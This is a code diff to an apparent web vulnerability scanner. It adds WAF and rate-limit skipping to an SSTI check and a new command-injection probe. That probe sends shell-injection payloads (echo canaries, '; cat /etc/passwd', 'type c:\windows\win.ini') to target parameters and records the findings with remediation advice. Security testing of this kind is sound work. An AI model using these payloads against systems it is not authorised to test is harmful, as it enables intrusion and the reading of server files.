@@ -118,8 +118,35 @@ export async function checkSSTI(target: Target, onLog: LogFn): Promise<RealFindi
       const testUrl    = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
 
       const baseline = await probe(baselineUrl, { timeoutMs: 8_000 });
-      const r        = await probe(testUrl,     { timeoutMs: 8_000 });
+      // Skip this parameter entirely if the baseline itself is WAF/rate-limited
+      if (!baseline) continue;
+      if (
+        baseline.status === 429 ||
+        (baseline.status === 403 &&
+          (baseline.headers["cf-mitigated"] ||
+           (baseline.headers["server"] ?? "").toLowerCase().includes("cloudflare") ||
+           (baseline.body ?? "").includes("cf-challenge") ||
+           (baseline.body ?? "").includes("__cf_bm") ||
+           (baseline.body ?? "").includes("Cloudflare Ray ID")))
+      ) {
+        await onLog(`[${ts()}] SSTI: WAF/rate-limit on param '${param}' (${baseline.status}) — skipping`);
+        break; // skip remaining payloads for this param
+      }
+      const r = await probe(testUrl, { timeoutMs: 8_000 });
       if (!r) continue;
+      // Also skip if the probe response itself is rate-limited or WAF-blocked
+      if (
+        r.status === 429 ||
+        (r.status === 403 &&
+          (r.headers["cf-mitigated"] ||
+           (r.headers["server"] ?? "").toLowerCase().includes("cloudflare") ||
+           (r.body ?? "").includes("cf-challenge") ||
+           (r.body ?? "").includes("__cf_bm") ||
+           (r.body ?? "").includes("Cloudflare Ray ID")))
+      ) {
+        await onLog(`[${ts()}] SSTI: WAF/rate-limit on probe response for param '${param}' (${r.status}) — skipping`);
+        break;
+      }
 
       const cleanBaseline = stripEphemeralTokens(baseline?.body ?? "");
       const cleanBody     = stripEphemeralTokens(r.body);
@@ -592,6 +619,138 @@ export async function checkCommandInjection(target: Target, onLog: LogFn): Promi
   }
 
   await onLog(`[${ts()}] Command injection: no canary execution confirmed`);
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// PHASE 27 — ENHANCED COMMAND INJECTION (CANARY + FILE READ EXPLOITATION)
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Enhanced Phase 27 command injection probe. After confirming a canary string
+ * executes, it additionally attempts to read /etc/passwd (Linux) or
+ * c:\windows\win.ini (Windows) to verify exploitability and include file
+ * content as evidence. The canary itself uses `printf` (no newline noise) so
+ * it is safe and non-destructive.
+ */
+export async function checkCommandInjectionDeep(target: Target, onLog: LogFn): Promise<RealFinding[]> {
+  const findings: RealFinding[] = [];
+  if (!activeProbesAllowed()) return findings;
+  await onLog(`[${ts()}] [Phase 27] Enhanced command injection — canary execution + file-read...`);
+
+  const SENTINELX_CMDI_CANARY = `SENTINELX_CMDI_CANARY_${Math.random().toString(36).slice(2, 8).toUpperCase()}`;
+
+  const CANARY_PAYLOADS: { p: string; shell: string }[] = [
+    { p: `; echo ${SENTINELX_CMDI_CANARY}`,           shell: "sh" },
+    { p: `| echo ${SENTINELX_CMDI_CANARY}`,           shell: "sh-pipe" },
+    { p: `$(echo ${SENTINELX_CMDI_CANARY})`,          shell: "bash-subshell" },
+    { p: `\`echo ${SENTINELX_CMDI_CANARY}\``,         shell: "bash-backtick" },
+    { p: `%0aecho%20${SENTINELX_CMDI_CANARY}`,        shell: "sh-encoded" },
+    { p: `& echo ${SENTINELX_CMDI_CANARY}`,           shell: "cmd" },
+    { p: `\n/bin/echo ${SENTINELX_CMDI_CANARY}`,      shell: "sh-newline" },
+  ];
+
+  const FILE_READ_PAYLOADS: { p: string; os: string; indicator: string }[] = [
+    { p: "; cat /etc/passwd",           os: "Linux",   indicator: "root:" },
+    { p: "| cat /etc/passwd",           os: "Linux",   indicator: "root:" },
+    { p: "$(cat /etc/passwd)",          os: "Linux",   indicator: "root:" },
+    { p: "; type c:\\windows\\win.ini", os: "Windows", indicator: "[fonts]" },
+    { p: "& type c:\\windows\\win.ini", os: "Windows", indicator: "[fonts]" },
+  ];
+
+  const PARAMS = ["cmd", "exec", "command", "run", "shell", "ping", "host", "ip", "target", "file", "path", "name", "url", "q", "search", "addr"];
+
+  for (const param of PARAMS.slice(0, 8)) {
+    let confirmedParam: string | null = null;
+    let confirmedPayload: string | null = null;
+    let confirmedShell: string | null = null;
+
+    // Step 1: Confirm canary execution
+    for (const { p, shell } of CANARY_PAYLOADS.slice(0, 5)) {
+      if (!activeProbesAllowed()) break;
+      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(p)}`;
+      const r = await probe(probeUrl, { timeoutMs: 8_000 });
+      if (!r) continue;
+      // Skip if WAF/rate-limited
+      if (r.status === 429 || (r.status === 403 && (r.headers["cf-mitigated"] || r.headers["server"]?.includes("cloudflare")))) {
+        await onLog(`[${ts()}] [Phase 27] WAF/rate-limit on param '${param}' — skipping`);
+        break;
+      }
+      if (r.body.includes(SENTINELX_CMDI_CANARY)) {
+        confirmedParam   = param;
+        confirmedPayload = p;
+        confirmedShell   = shell;
+        findings.push({
+          title: `Remote Code Execution via Command Injection — SENTINELX_CMDI_CANARY Executed (${shell})`,
+          severity: "critical",
+          verification: "verified",
+          confidence: 99,
+          cvss: 10.0,
+          cve: null,
+          description: `OS command injection confirmed via '${param}' parameter. The unique canary string ${SENTINELX_CMDI_CANARY} was returned in the response after execution, confirming arbitrary code execution on the server.`,
+          evidence: `PROBE: GET ${probeUrl}\nPARAM: ${param}=${p}\nCANARY: ${SENTINELX_CMDI_CANARY}\nHTTP ${r.status} — canary found in response body\nSnippet: ${r.body.slice(0, 400)}`,
+          remediation: "Never pass user input to shell/exec functions. Use language-native libraries. If shell is unavoidable, use allowlist validation and proper argument quoting.",
+        });
+        await onLog(`[${ts()}] ⚠ [Phase 27] CMDI CANARY EXECUTED via '${param}' (${shell})`);
+        break;
+      }
+    }
+
+    // Step 2: If canary executed, attempt file read for exploitation proof
+    if (confirmedParam !== null && confirmedPayload !== null) {
+      for (const { p: filePayload, os, indicator } of FILE_READ_PAYLOADS) {
+        if (!activeProbesAllowed()) break;
+        // Replace the canary-producing part with the file-read command
+        const fileProbeUrl = `${target.url.replace(/\/$/, "")}?${confirmedParam}=${encodeURIComponent(filePayload)}`;
+        const fr = await probe(fileProbeUrl, { timeoutMs: 10_000 });
+        if (!fr) continue;
+        if (fr.body.includes(indicator)) {
+          const snippet = fr.body.slice(fr.body.indexOf(indicator), fr.body.indexOf(indicator) + 300).replace(/\n/g, "\\n");
+          findings.push({
+            title: `File Read via Command Injection — ${os} ${indicator === "root:" ? "/etc/passwd" : "win.ini"} Exposed`,
+            severity: "critical",
+            verification: "verified",
+            confidence: 99,
+            cvss: 10.0,
+            cve: null,
+            description: `Following command injection canary confirmation via '${confirmedParam}', a file-read payload successfully returned system file content (${os}). This confirms unrestricted operating-system command execution with file-system read access.`,
+            evidence: `CANARY PAYLOAD (confirmed): ${confirmedPayload} via ${confirmedShell}\nFILE READ URL: GET ${fileProbeUrl}\nFILE READ PAYLOAD: ${filePayload}\nHTTP ${fr.status}\nFILE CONTENT SNIPPET: ${snippet}`,
+            remediation: "1. Remove the command injection vulnerability immediately (see previous finding).\n2. Rotate all credentials, API keys, and secrets on this server.\n3. Audit server logs for unauthorized command execution.\n4. Run the server as a least-privilege user with no file-system access beyond app directories.\n5. Implement a web application firewall as a defence-in-depth measure.",
+          });
+          await onLog(`[${ts()}] ⚠ [Phase 27] FILE READ CONFIRMED — ${os} system file exposed via param '${confirmedParam}'`);
+          return findings;
+        }
+      }
+      return findings; // Canary confirmed — return even if file read didn't land
+    }
+  }
+
+  // POST body canary check
+  if (activeProbesAllowed()) {
+    const jsonCanaryPayload = `; echo ${SENTINELX_CMDI_CANARY}`;
+    const r = await probe(target.url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ cmd: jsonCanaryPayload, command: jsonCanaryPayload, exec: jsonCanaryPayload }),
+      timeoutMs: 8_000,
+    });
+    if (r?.body.includes(SENTINELX_CMDI_CANARY)) {
+      findings.push({
+        title: "Remote Code Execution via Command Injection — POST JSON Body (CMDI Canary Executed)",
+        severity: "critical",
+        verification: "verified",
+        confidence: 99,
+        cvss: 10.0,
+        cve: null,
+        description: "Command injection confirmed via JSON POST body. The canary string was executed server-side and returned in the response.",
+        evidence: `POST ${target.url}\nContent-Type: application/json\nCanary: ${SENTINELX_CMDI_CANARY}\nHTTP ${r.status}\nCanary found in response body\nSnippet: ${r.body.slice(0, 400)}`,
+        remediation: "Never pass user input from any source to shell execution functions. Sanitise and validate all inputs.",
+      });
+      await onLog(`[${ts()}] ⚠ [Phase 27] CMDI canary executed via POST JSON body`);
+    }
+  }
+
+  await onLog(`[${ts()}] [Phase 27] Command injection deep probe: complete`);
   return findings;
 }
 
